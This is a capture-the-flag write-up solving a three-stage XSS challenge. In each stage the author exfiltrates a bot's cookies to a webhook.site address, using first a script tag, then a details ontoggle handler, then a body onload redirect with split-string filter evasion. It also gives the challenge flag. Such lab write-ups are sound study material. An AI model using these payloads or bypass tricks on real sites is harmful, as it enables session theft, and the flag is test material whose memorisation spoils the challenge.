## Solution :
The goal of this challenge is that we need to craft an XSS payload that would be sent to the bot to steal the cookie information, for that it was essential to have an place which would recieve the abovementioned cookies, so for that I used `webhook.site`,so using the link provided to me by webhook, i crafted this payload which would get the cookies :
```js
<script>fetch('https://webhook.site/61feb7a3-b6a7-45d7-a474-f24b6a1ab0bc?cookie='+document.cookie)</script>
```
What this payload does is send all the cookie information to the site we gave,

<img width="781" height="508" alt="image" src="https://github.com/user-attachments/assets/301de492-2af6-4f23-a314-126e890051d3" />

This Gave Me the cookie as shown above, now the cookie tells us to redirect to url, so on going there we find `XXS 2`,

<img width="1231" height="369" alt="image" src="https://github.com/user-attachments/assets/bf8c60ca-104a-4f2a-b6c4-4dc1392617a8" />

now this has some filters which we need to bypass, like we can't use script tag, so after searching for a good while I found this method to steal cookies, it is basically the same method used to get the cookie earlier but using the `detail` tag.
```js
<details open ontoggle=fetch('https://webhook.site/61feb7a3-b6a7-45d7-a474-f24b6a1ab0bc?c='+document.cookie)>
```
on sending this payload i got the following cookie :

<img width="787" height="511" alt="image" src="https://github.com/user-attachments/assets/159dc721-09ca-423b-b55a-c476884f8ff5" />

Now the filters had changed and made the challenge even harder,

<img width="469" height="182" alt="image" src="https://github.com/user-attachments/assets/0fb51b03-b8af-4dd2-8dc9-49b166d97977" />

Now the issue was first I can't use `document`, or `://` or `cookie`, now I thankfuly i found this site :

<img width="469" height="182" alt="image" src="https://github.com/user-attachments/assets/76c5739b-aeb8-4af2-a558-147931a1f26c" />

so I crafted the payload like this :
```js
<body onload="window.location='//webhook.site/61feb7a3-b6a7-45d7-a474-f24b6a1ab0bc?c='+window['documen'+'t']['cooki'+'e']">
```

in this payload i seperated the word `document` and `cookie` does not have the `:`in `://`, so finally this gave me the flag

<img width="766" height="349" alt="image" src="https://github.com/user-attachments/assets/b16caaa9-bdad-42a2-af64-49b08a1dc3fd" />

## Flag :
```
flag=nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
```
